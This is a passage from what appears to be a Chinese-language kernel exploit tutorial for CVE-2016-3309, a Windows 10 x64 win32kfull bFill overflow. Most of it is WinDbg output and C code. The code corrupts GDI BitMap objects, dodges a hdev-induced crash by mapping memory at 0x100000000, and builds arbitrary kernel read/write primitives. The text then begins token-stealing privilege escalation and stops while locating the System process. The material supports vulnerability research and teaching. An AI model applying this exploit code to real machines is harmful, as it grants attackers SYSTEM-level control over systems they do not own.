
```
0: kd> g

Breakpoint 0 hit

win32kfull!bFill+0x3e4:

fffff961`9e6c9108 e8ef3fd5ff      call    win32kfull!PALLOCMEM2 (fffff961`9e41d0fc)

0: kd> p

win32kfull!bFill+0x3e9:

fffff961`9e6c910d 4c8bf0          mov     r14,rax

3: kd> r rax

rax=fffff901458b0fb0

3: kd> dq fffff901458b0fb0 + 0x50 + 0xBC0

fffff901`458b1bc0  35306847`233e00bc 00000000`00000000

fffff901`458b1bd0  00000000`02051192 00000000`00000000

fffff901`458b1be0  00000000`00000000 00000000`00000000

fffff901`458b1bf0  00000000`02051192 00000000`00000000

fffff901`458b1c00  00000000`00000000 00000001`0000005c    // ffff901`458B1C08处即是sizlBitmap成员

fffff901`458b1c10  00000000`00000170 fffff901`458b1e28

fffff901`458b1c20  fffff901`458b1e28 00002e5b`00000170

fffff901`458b1c30  00010000`00000006 00000000`00000000
```

当越界写入操作完成时，`sizlBitmap`成员的大小就被扩大为`0x1 * 0xFFFFFFFF = 0xFFFFFFFF`，`sizelBitmap`成员的前一个成员，即`hdev`被修改为非0，而之后的成员，特别是`pvScan0`并没有被修改。

```
3: kd> g

Breakpoint 1 hit

win32kfull!bFill+0x46c:

fffff961`4a4c9190 ff156a7f0800    call    qword ptr [win32kfull!_imp_bConstructGET (fffff961`4a551100)]

3: kd> p

win32kfull!bFill+0x472:

fffff961`4a4c9196 8bd8            mov     ebx,eax

3: kd> dq fffff901458b0fb0 + 0x50 + 0xBC0

fffff901`458b1bc0  ffffffff`00000014 005a0b00`00000000

fffff901`458b1bd0  00000001`00000000 00000000`00000001

fffff901`458b1be0  fffff901`458b0fb0 00000000`0000001f

fffff901`458b1bf0  ffffffff`00000000 006a1f00`004a1f00

fffff901`458b1c00  00000001`00000000 00000001`ffffffff     // 此时sizlBitmap被扩大，且0xffff901`458b1c00中的hdev被修改了

fffff901`458b1c10  00000000`00000170 fffff901`458b1e28     // pvScan0指向的地址没有被修改，是正常的

fffff901`458b1c20  fffff901`458b1e28 00002e5b`00000170

fffff901`458b1c30  00010000`00000006 00000000`00000000
```

此时的`sizlBitmap`成员被扩大，也就是通过`SetBitmapBits`和`GetBitmapBits`对该`BitMap`对象可读写的地址被扩大了，而`pvScan0`并没有被修改，所以此时就可以将该`BitMap`对象作为work，将相邻页中的`BitMap`对象作为manger，通过修改相邻页中的`BitMap`对象中的`pvScan0`来实现任意地址读写。

获取work的方法也很简单，当创建`BitMap`对象的时候，指定的可读写的内存大小为`0x5C * 1 * 32 / 8 = 0x170`，所以可以遍历`BitMap`句柄的数组，调用`GetBitmapBits`来判断可读写的内存大小是否超过这个值，如果超过，说明该`BitMap`被修改了，相应代码如下：

```
	pBuf_2016_3309 = (PULONG64)malloc(0x1000);

	if (!pBuf_2016_3309)

	{

		bRet = FALSE;

		ShowError("malloc", GetLastError());

		goto exit;

	}



	ZeroMemory(pBuf_2016_3309, 0x1000);



	for (i = 0; i < dwBitNum; i++)

	{

		if (GetBitmapBits(hBitMap[i], 0x1000, pBuf_2016_3309) > 0x170)

		{

			g_hWorker_2016_3309 = hBitMap[i];

			g_hManager_2016_3309 = hBitMap[i + 1];

			break;

		}

	}

	

	if (!g_hWorker_2016_3309 || !g_hManager_2016_3309)

	{

		printf("not find BitMap\n");

		bRet = FALSE;

		goto exit;

	}
```

此时编译运行会出现BSOD错误，错误信息如下，可以看到是错误是在调用`GetBitmapBits`函数的时候，在`bAllowShareAccess`中会对`rax`偏移0x38处的内容进行读取操作，而此时该地址的内存是无效的。`rax`等于`BitMap`对象的`hdev`，所以这个错误是因为内存写入的时候，修改了`hdev`产生的。

```
rax=0000000100000000 rbx=ffffd000b6c019c8 rcx=ffffd000b6c019d0

rdx=ffffd000b6c019d0 rsi=fffff9014511dbd0 rdi=0000000100000000

rip=fffff9614a5a2553 rsp=ffffd000b6c018e8 rbp=ffffd000b6c01a20

 r8=fffff9614a4e7e58  r9=0000000000000000 r10=7ffff9014000b588

r11=7ffffffffffffffc r12=ffffd000b6c01b18 r13=0000000003ff3d58

r14=0000000000000000 r15=0000000000001000

iopl=0         nv up ei pl nz na po nc

cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206

win32kbase!PDEVOBJ::bAllowShareAccess+0x3:

fffff961`4a5a2553 8b5038          mov     edx,dword ptr [rax+38h] ds:002b:00000001`00000038=????????



STACK_TEXT:  

win32kbase!PDEVOBJ::bAllowShareAccess+0x3

win32kbase!NEEDGRELOCK::vLock+0x21

win32kfull!GreGetBitmapBits+0xf6

win32kfull!NtGdiGetBitmapBits+0xab



1: kd> dd 0000000100000000 + 0x38

00000001`00000038  ???????? ???????? ???????? ????????

00000001`00000048  ???????? ???????? ???????? ????????

00000001`00000058  ???????? ???????? ???????? ????????

00000001`00000068  ???????? ???????? ???????? ????????

00000001`00000078  ???????? ???????? ???????? ????????

00000001`00000088  ???????? ???????? ???????? ????????

00000001`00000098  ???????? ???????? ???????? ????????

00000001`000000a8  ???????? ???????? ???????? ????????
```

在错误函数`bAllowShareAccess`中，会将`hdev + 0x38`的地址取出并判断其是否为1，如果为1，则函数返回0，`GetMapbitsBits`函数就将调用成功。

```
.text:00000001C0012550 ; __int64 __fastcall PDEVOBJ::bAllowShareAccess(PDEVOBJ *__hidden this)

.text:00000001C0012550                 mov     rax, [rcx]

.text:00000001C0012553                 mov     edx, [rax+38h]

.text:00000001C0012556                 test    dl, 1

.text:00000001C0012559                 jz      short loc_1C00125C1

                    // 省略部分代码

.text:00000001C00125C1 loc_1C00125C1:                          

.text:00000001C00125C1                                         

.text:00000001C00125C1                 xor     eax, eax

.text:00000001C00125C3                 retn

.text:00000001C00125C3 ?bAllowShareAccess@PDEVOBJ@@QEAAHXZ endp
```

根据上面的调试可以看到，`hdev`的值被修改为`0x1 0000 0000`。所以要避开上面的BSOD错误，只要在`0x1 0000 0000`处申请内存，且将`0x1 0000 0038`的值修改为1即可，相应代码如下：

```
	PBYTE pBuffer = (PBYTE)VirtualAlloc((PVOID)0x100000000,

					    0x1000,

					    MEM_COMMIT | MEM_RESERVE,

					    PAGE_READWRITE);

	if (!pBuffer)

	{

		ShowError("VirtualAlloc", GetLastError());

		bRet = FALSE;

		goto exit;

	}



	*(pBuffer + 0x38) = 1;
```

现在得到了可以修改`0xFFFFFFFF`大小的`BitMap`对象的`hWorker`，只需要用它修改相邻内存页的`BitMap`对象的`pvScan0`就可以实现任意地址读写。`hWorker`的`pvScan0`所指地址为`hWorker`的`BitMap`对象之后，所以相邻内存页的`pvScan0`相对于它的偏移就是`0x1D0(0x1000 - 0xBC0 - 0x10 -0x260) + 0xBC0 + 0x10 + 0x18 + 0x38 = 0x1D0 + 0xC20 = 0xDF8`。所以通过`SetBitmapBits`修改`hWorker`偏移`0xDF8`处的内存就可以修改相邻内存页`BitMap`对象的`pvScan0`，此时就可以完成任意地址读写，相应的代码如下：

```
BOOL SetAddress_CVE_2016_3309(ULONG64 ulAddress)

{

	BOOL bRet = TRUE;



	pBuf_2016_3309[0xDF8 / 8] = ulAddress;



	if (SetBitmapBits(g_hWorker_2016_3309, 0x1000, pBuf_2016_3309) < 0x1000)

	{

		ShowError("SetBitmapBits", GetLastError());

		bRet = FALSE;

		goto exit;

	}



exit:

	return bRet;

}



BOOL BitMapRead_CVE_2016_3309(ULONG64 ulAddress, PBYTE pRes, DWORD dwSize)

{

	BOOL bRet = TRUE;



	if (!SetAddress_CVE_2016_3309(ulAddress))

	{

		bRet = FALSE;

		goto exit;

	}



	if (GetBitmapBits(g_hManager_2016_3309, dwSize, pRes) < dwSize)

	{

		ShowError("GetBitmapBits", GetLastError());

		bRet = FALSE;

		goto exit;

	}



exit:

	return bRet;

}



BOOL BitMapWrite_CVE_2016_3309(ULONG64 ulAddress, PBYTE pRes, DWORD dwSize)

{

	BOOL bRet = TRUE;



	if (!SetAddress_CVE_2016_3309(ulAddress))

	{

		bRet = FALSE;

		goto exit;

	}



	if (SetBitmapBits(g_hManager_2016_3309, dwSize, pRes) < dwSize)

	{

		ShowError("GetBitmapBits", GetLastError());

		bRet = FALSE;

		goto exit;

	}



exit:

	return bRet;

}
```

# 四.运行结果

在win 10 x64系统上，与提权相关的几个成员如下：

```
2: kd> dt _EPROCESS

nt!_EPROCESS

   +0x2e8 UniqueProcessId  : Ptr64 Void

   +0x2f0 ActiveProcessLinks : _LIST_ENTRY

   +0x358 Token            : _EX_FAST_REF



2: kd> dt _LIST_ENTRY

FLTMGR!_LIST_ENTRY

   +0x000 Flink            : Ptr64 _LIST_ENTRY

   +0x008 Blink            : Ptr64 _LIST_ENTRY
```

想要实现提权就要将`System`进程的`Token`赋值给本进程的`Token`，在`ntoskrnl.exe`内核文件中，全局变量`PsInitialSystemProcess`保存了`System`进程`EPROCESS`地址：

![](https://bbs.kanxue.com/upload/attach/202205/835440_UDNMQS2C9VYP8GX.jpg)

所以只要找到当前系统中运行的`ntoskrnl.exe`内核中的`PsInitialSystemProcess`地址就可以获取`System`进程的`EPEROCESS`地址，`PsInitialSystemProcess`相对于内核文件的偏移可以通过`GetProceAddress`获取，而当前系统中运行的内核文件的地址则需要以下函数获取：

```
BOOL WINAPI EnumDeviceDrivers(

  __out  LPVOID* lpImageBase,

  __in   DWORD cb,

  __out  LPDWORD lpcbNeeded);
```

第一个参数用来接收系统中运行的驱动文件的地址，该变量将会指向一个`ULONG64`的数组，其中第一个元素就是当前系统运行的`ntoskrnl.exe`的地址，因此，可以通过以下代码来获取`System`进程的`EPROCESS`地址：
